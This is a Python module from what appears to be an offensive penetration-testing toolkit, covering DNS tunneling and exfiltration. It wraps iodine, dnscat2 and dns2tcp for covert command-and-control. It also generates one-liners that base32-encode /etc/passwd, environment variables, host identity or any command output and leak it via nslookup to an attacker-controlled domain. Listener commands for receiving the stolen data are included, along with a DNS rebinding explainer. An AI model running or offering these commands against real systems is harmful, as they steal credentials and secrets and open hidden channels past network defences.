"""DNS Tunneling — Data exfiltration and C2 over DNS.

Wrappers for iodine, dnscat2, dns2tcp. Built-in DNS exfil helper.
"""

import sys
import os
import base64

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel)
from executor import run_command, run_with_preview
from tool_manager import check_tool

DNS_TOOLS = {
    "iodine": {
        "description": "IP-over-DNS tunnel (full TCP/IP through DNS)",
        "install": "brew install iodine",
        "server": "iodined -f -c -P {password} {tunnel_ip} {domain}",
        "client": "iodine -f -P {password} {dns_server} {domain}",
    },
    "dnscat2": {
        "description": "Encrypted C2 channel over DNS",
        "install": "git clone https://github.com/iagox86/dnscat2.git ~/tools/dnscat2 && cd ~/tools/dnscat2/server && bundle install",
        "server": "ruby ~/tools/dnscat2/server/dnscat2.rb {domain}",
        "client": "~/tools/dnscat2/client/dnscat {domain}",
    },
    "dns2tcp": {
        "description": "TCP tunneling over DNS",
        "install": "brew install dns2tcp",
        "server": "dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf",
        "client": "dns2tcpc -r ssh -z {domain} {dns_server}",
    },
}

# ─── Built-in DNS Exfiltration ────────────────────────────────────────────────

def _dns_exfil_encode(data, domain):
    """Encode data as DNS queries for exfiltration."""
    encoded = base64.b32encode(data.encode()).decode().rstrip('=').lower()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    queries = []
    for i, chunk in enumerate(chunks):
        query = f"{chunk}.{i}.{domain}"
        queries.append(query)
    return queries


def _dns_exfil_generator(session):
    """Generate DNS exfiltration commands."""
    console.print("\n[bold cyan]DNS Exfiltration Generator[/bold cyan]\n")
    domain = ask("Your DNS domain (attacker-controlled)")
    
    console.print("\n[bold yellow]Choose data to exfiltrate:[/bold yellow]")
    options = [
        ("1", "Custom text / file content"),
        ("2", "/etc/passwd"),
        ("3", "Environment variables"),
        ("4", "whoami + hostname + IP"),
        ("5", "Custom command output"),
        ("0", "Back"),
    ]
    choice = show_menu(options)
    
    if choice == "0":
        return
    
    commands = {
        "1": None,
        "2": f"cat /etc/passwd | base32 | tr -d '=' | fold -w 63 | while read l; do nslookup $l.{domain}; done",
        "3": f"env | base32 | tr -d '=' | fold -w 63 | while read l; do nslookup $l.{domain}; done",
        "4": f"echo $(whoami)_$(hostname)_$(curl -s ifconfig.me) | base32 | tr -d '=' | fold -w 63 | while read l; do nslookup $l.{domain}; done",
        "5": None,
    }
    
    if choice == "1":
        data = ask("Enter text to exfiltrate")
        queries = _dns_exfil_encode(data, domain)
        console.print(f"\n[bold green]DNS Queries ({len(queries)}):[/bold green]\n")
        for q in queries:
            console.print(f"  nslookup {q}")
            console.print(f"  dig {q}")
        console.print(f"\n[bold cyan]One-liner:[/bold cyan]")
        console.print(f"  echo '{data}' | base32 | tr -d '=' | fold -w 63 | while read l; do nslookup $l.{domain}; done")
    elif choice == "5":
        cmd = ask("Command whose output to exfiltrate")
        console.print(f"\n[bold green]Exfil command:[/bold green]")
        console.print(f"  {cmd} | base32 | tr -d '=' | fold -w 63 | while read l; do nslookup $l.{domain}; done")
    else:
        console.print(f"\n[bold green]Exfil command:[/bold green]")
        console.print(f"  {commands[choice]}")


# ─── DNS Listener (Receiver) ─────────────────────────────────────────────────

def _dns_listener_helper():
    """Help set up a DNS listener to receive exfiltrated data."""
    console.print("\n[bold cyan]DNS Listener Setup[/bold cyan]\n")
    console.print("[bold]Options for receiving DNS exfil data:[/bold]\n")
    
    helpers = {
        "tcpdump": "sudo tcpdump -i any -n 'port 53' -l | grep --line-buffered -oP '\\S+\\.your\\.domain'",
        "tshark": "tshark -i any -Y 'dns.qry.type == 1' -T fields -e dns.qry.name | grep your.domain",
        "dnschef": "sudo python3 dnschef.py --fakeip 127.0.0.1 -i 0.0.0.0",
        "Responder": "sudo responder -I eth0 -A",
        "Python (simple)": """python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
while True:
    data, addr = s.recvfrom(512)
    # Extract queried domain from DNS packet
    domain = ''
    i = 12
    while data[i] != 0:
        length = data[i]
        domain += data[i+1:i+1+length].decode() + '.'
        i += length + 1
    print(f'{addr[0]}: {domain}')
"
""",
    }
    
    for name, cmd in helpers.items():
        console.print(f"  [bold yellow]{name}:[/bold yellow]")
        console.print(f"    [white]{cmd}[/white]\n")


# ─── Menu ─────────────────────────────────────────────────────────────────────

def run(session):
    show_stage_header("DNS Tunneling", "Exfiltrate data and establish C2 over DNS")
    
    while True:
        options = [
            ("", "[bold white]── DNS TUNNEL TOOLS ──[/bold white]"),
            ("1", "[bold]iodine[/bold] — Full IP-over-DNS tunnel"),
            ("2", "[bold]dnscat2[/bold] — Encrypted DNS C2"),
            ("3", "[bold]dns2tcp[/bold] — TCP over DNS"),
            ("", "[bold white]── BUILT-IN ──[/bold white]"),
            ("4", "[bold]DNS Exfiltration Generator[/bold] — Encode data as DNS queries"),
            ("5", "[bold]DNS Listener Setup[/bold] — Receive exfiltrated data"),
            ("6", "[bold]DNS Rebinding Helper[/bold]"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)
        
        if choice == "0":
            return
        elif choice in ("1", "2", "3"):
            tool_names = {"1": "iodine", "2": "dnscat2", "3": "dns2tcp"}
            _tool_menu(tool_names[choice], session)
        elif choice == "4":
            _dns_exfil_generator(session)
        elif choice == "5":
            _dns_listener_helper()
        elif choice == "6":
            _dns_rebinding()


def _tool_menu(tool_name, session):
    config = DNS_TOOLS[tool_name]
    console.print(f"\n[bold cyan]{tool_name} — {config['description']}[/bold cyan]\n")
    
    options = [
        ("1", "Server mode (attacker)"),
        ("2", "Client mode (target)"),
        ("3", "Install instructions"),
        ("0", "Back"),
    ]
    choice = show_menu(options)
    
    if choice == "0":
        return
    elif choice == "1":
        import re
        template = config["server"]
        placeholders = set(re.findall(r'\{(\w+)\}', template))
        params = {}
        for p in sorted(placeholders):
            params[p] = ask(f"{p}")
        cmd = template.format(**params)
        run_with_preview(cmd, session, "dns_tunnel")
    elif choice == "2":
        import re
        template = config["client"]
        placeholders = set(re.findall(r'\{(\w+)\}', template))
        params = {}
        for p in sorted(placeholders):
            params[p] = ask(f"{p}")
        cmd = template.format(**params)
        run_with_preview(cmd, session, "dns_tunnel")
    elif choice == "3":
        console.print(f"\n  [bold]Install:[/bold] {config['install']}\n")
        if confirm("Install now?"):
            run_command(config["install"], timeout=300)


def _dns_rebinding():
    console.print("\n[bold cyan]DNS Rebinding Attack Helper[/bold cyan]\n")
    console.print("[bold]How DNS rebinding works:[/bold]")
    console.print("  1. Victim visits attacker's domain")
    console.print("  2. First DNS response: attacker's IP (serves malicious JS)")
    console.print("  3. Second DNS response: internal IP (e.g., 127.0.0.1)")
    console.print("  4. Browser's same-origin policy considers both same origin")
    console.print("  5. Malicious JS can now access internal services\n")
    
    console.print("[bold yellow]Tools:[/bold yellow]")
    console.print("  • singularity: https://github.com/nccgroup/singularity")
    console.print("  • rbndr.us — quick DNS rebinding test")
    console.print("  • whonow — dynamic DNS rebinding server\n")
